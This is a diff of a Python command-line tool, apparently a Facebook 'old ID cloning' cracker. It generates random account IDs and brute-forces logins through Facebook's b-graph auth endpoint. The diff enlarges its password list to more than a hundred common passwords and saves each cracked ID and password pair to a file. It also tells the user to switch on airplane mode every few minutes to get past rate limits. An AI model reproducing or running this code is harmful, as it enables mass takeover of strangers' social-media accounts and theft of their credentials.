@@ -606,16 +606,17 @@ def line():print(f'\r\n\33[38;5;37m━━━━━━━━━━━━━━━
 
 
 logo = f"""
- \033[1;97m ████████  █████  ██████  ██████  ██    ██ 
-   \033[1;32m  ██    ██   ██ ██   ██ ██   ██ ██    ██   
-   \033[1;97m  ██    ███████ ██████  ██████  ██    ██   
-    \033[1;32m ██    ██   ██ ██   ██ ██   ██ ██    ██ 
-     \033[1;32m██    ██   ██ ██████  ██████   ██████
+[1;92m████████╗ █████╗ ██████╗ ██████╗ ██╗   ██╗
+[1;93m╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██║   ██║
+   [1;94m██║   ███████║██████╔╝██████╔╝██║   ██║
+   [1;95m██║   ██╔══██║██╔══██╗██╔══██╗██║   ██║
+   [1;96m██║   ██║  ██║██████╔╝██████╔╝╚██████╔╝
+   [1;97m╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ 
 \33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mDEVELOPER   \33[38;5;160m▶  \033[1;97mMUHAMMAD TABASSUM
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mGITHUB      \33[38;5;160m▶  \033[1;97mTabbu Arain
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mFEATURES    \33[38;5;160m▶  \033[1;97mOLD CLONING 
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mVERSION     \33[38;5;160m▶  \033[1;97mFREE \33[38;5;37m≫ \033[1;97mUPDATED 2.0
+\33[38;5;160m[\033[1;97m[😈]\33[38;5;160m] \033[1;97mDEVELOPER   \33[38;5;160m➤  \033[1;97m𝙈𝙐𝙃𝘼𝙈𝙈𝘼𝘿 𝙏𝘼𝘽𝘼𝙎𝙎𝙐𝙈
+\33[38;5;160m[\033[1;97m[😈]\33[38;5;160m] \033[1;97mGITHUB      \33[38;5;160m➤  \033[1;97m𝙏𝙖𝙗𝙗𝙪-𝘼𝙧𝙖𝙞𝙣
+\33[38;5;160m[\033[1;97m[😈]\33[38;5;160m] \033[1;97mFEATURES    \33[38;5;160m➤  \033[1;97m𝙊𝙇𝘿 𝘾𝙇𝙊𝙉𝙄𝙉𝙂 
+\33[38;5;160m[\033[1;97m[😈]\33[38;5;160m] \033[1;97mVERSION     \33[38;5;160m➤  \033[1;97m𝙵𝚁𝙴𝙴 🥳 \33[38;5;37m≫ \033[1;97m𝙐𝙋𝘿𝘼𝙏𝙀𝘿 2.1
 \33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
 
 def clear():
@@ -629,12 +630,11 @@ def main():
 		sys.stdout.write(f"\r{r}[{w}ᯤ{r}]{s} LOADING...\033[97;1m " + animation[i % len(animation)] +"\x1b[0m ")
 		sys.stdout.flush()
 	clear()
-	print(f'\33[38;5;160m[\033[1;97mA\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2007\33[38;5;160m/\33[38;5;37m2008\33[38;5;160m]\033[1;97m')
-	print(f'\33[38;5;160m[\033[1;97mB\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2009\33[38;5;160m/\33[38;5;37m2010\33[38;5;160m]\033[1;97m')
-	print(f'\33[38;5;160m[\033[1;97mC\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2011\33[38;5;160m/\33[38;5;37m2012\33[38;5;160m]\033[1;97m')
-	print(f'\33[38;5;160m[\033[1;97mD\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2013\33[38;5;160m/\33[38;5;37m2014\33[38;5;160m]\033[1;97m')
+	print(f'\33[38;5;160m[\033[1;97mA/1\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2009\33[38;5;160m/\33[38;5;37m2010\33[38;5;160m]\033[1;97m')
+	print(f'\33[38;5;160m[\033[1;97mB/2\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2011\33[38;5;160m/\33[38;5;37m2012\33[38;5;160m]\033[1;97m')
+	print(f'\33[38;5;160m[\033[1;97mC/3\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2013\33[38;5;160m/\33[38;5;37m2014\33[38;5;160m]\033[1;97m')
 	linex()
-	ch = input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
+	ch = input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m➤ \033[1;97m')
 	if ch in ('1','01','11','A','১','০১','a','A'):
 		__Old1__()
 	elif ch in ('2','02','22','b','B'):
@@ -647,17 +647,20 @@ def main():
 def __Old1__():
     user=[]
     clear()
-    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m20000\33[38;5;37m|\033[1;97m40000\33[38;5;37m|\033[1;97m60000\33[38;5;37m|\033[1;97m80000')
+    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ➤ \033[1;97m20000\33[38;5;37m|\033[1;97m40000\33[38;5;37m|\033[1;97m60000\33[38;5;37m|\033[1;97m80000')
     linex()
-    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
+    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m➤ \033[1;97m')
     linex()
     year_code = '100000'
     for i in range(int(limit)):
     	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
-    with tred(max_workers=100) as jihad:
+    with tred(max_workers=50) as jihad:
         clear()
-        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
-        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSE AIRPLANE MODE AFTER EVERY 5 MINUTES ')
+        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m➤ \033[1;97m{limit}')
+        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSE AIRPLANE MODE AFTER EVERY 5 MINUTES ')     
+        print(' \x1b[1;98m║══[😈]💥  ONLY ACTIVE ID CLONE 100%')
+        print(' \x1b[1;93m║══[😈]💥  CP ID WILL BE LOGIN 80%')
+        print(' \x1b[1;97m║══[😈]💥  WI-FI  AND DATA BOTH WORKING 100%')
         linex()
         for mal in user:
         	uid=year_code+mal
@@ -668,17 +671,20 @@ def __Old1__():
 def __Old2__():
     user=[]
     clear()
-    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m20000\33[38;5;37m|\033[1;97m40000\33[38;5;37m|\033[1;97m60000\33[38;5;37m|\033[1;97m80000')
+    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ➤ \033[1;97m20000\33[38;5;37m|\033[1;97m40000\33[38;5;37m|\033[1;97m60000\33[38;5;37m|\033[1;97m80000')
     linex()
-    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
+    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m➤ \033[1;97m')
     linex()
     year_code = '10000'
     for i in range(int(limit)):
     	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
-    with tred(max_workers=100) as jihad:
+    with tred(max_workers=50) as jihad:
         clear()
-        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
-        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSE AIRPLANE MODE AFTER EVERY 5 MINUTES ')
+        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m➤ \033[1;97m{limit}')
+        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSE AIRPLANE MODE AFTER EVERY 5 MINUTES ')     
+        print(' \x1b[1;98m║══[😈]💥  ONLY ACTIVE ID CLONE 100%')
+        print(' \x1b[1;93m║══[😈]💥  CP ID WILL BE LOGIN 80%')
+        print(' \x1b[1;97m║══[😈]💥  WI-FI  AND DATA BOTH WORKING 100%')
         linex()
         for mal in user:
             uid=year_code+mal
@@ -688,17 +694,20 @@ def __Old2__():
 def __Old3__():
     user=[]
     clear()
-    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m20000\33[38;5;37m|\033[1;97m40000\33[38;5;37m|\033[1;97m60000\33[38;5;37m|\033[1;97m80000')
+    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ➤ \033[1;97m20000\33[38;5;37m|\033[1;97m40000\33[38;5;37m|\033[1;97m60000\33[38;5;37m|\033[1;97m80000')
     linex()
-    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
+    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m➤ \033[1;97m')
     linex()
     year_code = '10000'
     for i in range(int(limit)):
     	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
-    with tred(max_workers=100) as jihad:
+    with tred(max_workers=50) as jihad:
         clear()
-        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
-        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSE AIRPLANE MODE AFTER EVERY 5 MINUTES ')
+        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m➤ \033[1;97m{limit}')
+        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSE AIRPLANE MODE AFTER EVERY 5 MINUTES ')     
+        print(' \x1b[1;98m║══[😈]💥  ONLY ACTIVE ID CLONE 100%')
+        print(' \x1b[1;93m║══[😈]💥  CP ID WILL BE LOGIN 80%')
+        print(' \x1b[1;97m║══[😈]💥  WI-FI  AND DATA BOTH WORKING 100%')
         linex()
         for mal in user:
             uid=year_code+mal
@@ -708,17 +717,20 @@ def __Old3__():
 def __Old4__():
     user=[]
     clear()
-    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶\033[1;97m 20000\33[38;5;37m|\033[1;97m40000\33[38;5;37m|\033[1;97m60000\33[38;5;37m|\033[1;97m80000')
+    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ➤\033[1;97m 20000\33[38;5;37m|\033[1;97m40000\33[38;5;37m|\033[1;97m60000\33[38;5;37m|\033[1;97m80000')
     linex()
-    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
+    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m➤ \033[1;97m')
     linex()
     year_code = '10000'
     for i in range(int(limit)):
     	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
-    with tred(max_workers=100) as jihad:
+    with tred(max_workers=50) as jihad:
         clear()
-        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
-        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSE AIRPLANE MODE AFTER EVERY 5 MINUTES ')
+        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m➤ \033[1;97m{limit}')
+        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSE AIRPLANE MODE AFTER EVERY 5 MINUTES ')     
+        print(' \x1b[1;98m║══[😈]💥  ONLY ACTIVE ID CLONE 100%')
+        print(' \x1b[1;93m║══[😈]💥  CP ID WILL BE LOGIN 80%')
+        print(' \x1b[1;97m║══[😈]💥  WI-FI  AND DATA BOTH WORKING 100%')
         linex()
         for mal in user:
             uid=year_code+mal
@@ -733,7 +745,7 @@ def login1(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456","password","12345678","qwerty","abc123","123456789","111111","1234567","iloveyou","adobe123","admin","welcome","monkey","letmein","sunshine","master","123123","football","shadow","princess","123qwe","654321","superman","michael","1qaz2wsx","baseball","dragon","qwertyuiop","mustang","access","jennifer","jordan","trustno1","harley","batman","starwars","matrix","ashley","hello","hunter","freedom","ninja","password1","solo","welcome1","charlie","andrew","flower","thomas","dallas","pepper","jessica","ginger","password123","liverpool","joshua","131313","samsung","azerty","michelle","7777777","internet","cookie","photoshop","daniel","george","chocolate","snoopy","aaron","soccer","summer","loveme","1234","buster","purple","secret","mercedes","chelsea","computer","amanda","ginger","banana","justin","tigger","mother","bailey","anthony","qwe123","diamond","patrick","martin","ginger","victoria","slipknot","jackson","whatever","888888","password!","1234567","1234567890","0987654321","7654321","87654321","987654321","123abc","123ABC","abc123","ABC123","1234abcd","1234ABCD","ABCD1234","abcd1234","I Love You","iloveyou","ILOVEYOU","I LOVE YOU","ILoveYou","i love you"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -774,12 +786,12 @@ def login1(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m| \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m| \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
@@ -794,7 +806,7 @@ def login2(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456","password","12345678","qwerty","abc123","123456789","111111","1234567","iloveyou","adobe123","admin","welcome","monkey","letmein","sunshine","master","123123","football","shadow","princess","123qwe","654321","superman","michael","1qaz2wsx","baseball","dragon","qwertyuiop","mustang","access","jennifer","jordan","trustno1","harley","batman","starwars","matrix","ashley","hello","hunter","freedom","ninja","password1","solo","welcome1","charlie","andrew","flower","thomas","dallas","pepper","jessica","ginger","password123","liverpool","joshua","131313","samsung","azerty","michelle","7777777","internet","cookie","photoshop","daniel","george","chocolate","snoopy","aaron","soccer","summer","loveme","1234","buster","purple","secret","mercedes","chelsea","computer","amanda","ginger","banana","justin","tigger","mother","bailey","anthony","qwe123","diamond","patrick","martin","ginger","victoria","slipknot","jackson","whatever","888888","password!","1234567","1234567890","0987654321","7654321","87654321","987654321","123abc","123ABC","abc123","ABC123","1234abcd","1234ABCD","ABCD1234","abcd1234","I Love You","iloveyou","ILOVEYOU","I LOVE YOU","ILoveYou","i love you"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -835,12 +847,12 @@ def login2(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m| \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m| \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
@@ -855,7 +867,7 @@ def login3(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456","password","12345678","qwerty","abc123","123456789","111111","1234567","iloveyou","adobe123","admin","welcome","monkey","letmein","sunshine","master","123123","football","shadow","princess","123qwe","654321","superman","michael","1qaz2wsx","baseball","dragon","qwertyuiop","mustang","access","jennifer","jordan","trustno1","harley","batman","starwars","matrix","ashley","hello","hunter","freedom","ninja","password1","solo","welcome1","charlie","andrew","flower","thomas","dallas","pepper","jessica","ginger","password123","liverpool","joshua","131313","samsung","azerty","michelle","7777777","internet","cookie","photoshop","daniel","george","chocolate","snoopy","aaron","soccer","summer","loveme","1234","buster","purple","secret","mercedes","chelsea","computer","amanda","ginger","banana","justin","tigger","mother","bailey","anthony","qwe123","diamond","patrick","martin","ginger","victoria","slipknot","jackson","whatever","888888","password!","1234567","1234567890","0987654321","7654321","87654321","987654321","123abc","123ABC","abc123","ABC123","1234abcd","1234ABCD","ABCD1234","abcd1234","I Love You","iloveyou","ILOVEYOU","I LOVE YOU","ILoveYou","i love you"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -896,12 +908,12 @@ def login3(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m| \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m| \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
@@ -916,7 +928,7 @@ def login4(uid):
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        for pw in ["123456","password","12345678","qwerty","abc123","123456789","111111","1234567","iloveyou","adobe123","admin","welcome","monkey","letmein","sunshine","master","123123","football","shadow","princess","123qwe","654321","superman","michael","1qaz2wsx","baseball","dragon","qwertyuiop","mustang","access","jennifer","jordan","trustno1","harley","batman","starwars","matrix","ashley","hello","hunter","freedom","ninja","password1","solo","welcome1","charlie","andrew","flower","thomas","dallas","pepper","jessica","ginger","password123","liverpool","joshua","131313","samsung","azerty","michelle","7777777","internet","cookie","photoshop","daniel","george","chocolate","snoopy","aaron","soccer","summer","loveme","1234","buster","purple","secret","mercedes","chelsea","computer","amanda","ginger","banana","justin","tigger","mother","bailey","anthony","qwe123","diamond","patrick","martin","ginger","victoria","slipknot","jackson","whatever","888888","password!","1234567","1234567890","0987654321","7654321","87654321","987654321","123abc","123ABC","abc123","ABC123","1234abcd","1234ABCD","ABCD1234","abcd1234","I Love You","iloveyou","ILOVEYOU","I LOVE YOU","ILoveYou","i love you"]:
             data = {'adid':str(uuid.uuid4()),
             'format': 'json',
             'device_id':str(uuid.uuid4()),
@@ -957,12 +969,12 @@ def login4(uid):
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m| \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m| \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
@@ -973,7 +985,7 @@ def meyexudi():
   os.system('clear')
   print(logo)
   
-  uuid = "md"+str(os.getuid())+"tabbu"+str(os.getuid())+"FREE.TOOL"
+  uuid = "MR"+str(os.getuid())+"TABBU-ARAIN"+str(os.getuid())+"FREE.TOOL"
   id = ''.join(uuid)
   try:
     httpCaht = requests.get(f"https://github.com/Tabbu-Arain/Tabbu-xd/blob/main/approval.txt").text
@@ -986,7 +998,7 @@ def meyexudi():
       print(' \x1b[1;98m║══[•]💥  ONLY ACTIVE ID CLONE 100%')
       print(' \x1b[1;93m║══[•]💥  CP ID WILL BE LOGIN 80%')
       print(' \x1b[1;97m║══[•]💥  WI-FI  AND DATA BOTH WORKING 100%')
-      os.system('espeak -a 300 " Assalamualaikum,   I,   Am,    Robot,   of,   TABBU,   KING ,    Please,   Send,   Your,   Key,"')
+      os.system('espeak -a 300 " Assalamualaikum,   I,   Am,    Robot,   of,   Tabbu,   Arain ,    Please,   Send,   Your,   Key,"')
       print(" \x1b[0m║══[KEY]  : "+id)
       uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
       input(' \033[1;30m╚══[•] IF U WANT APPROVAL FOR FREE THEN PRESS ENTER ')
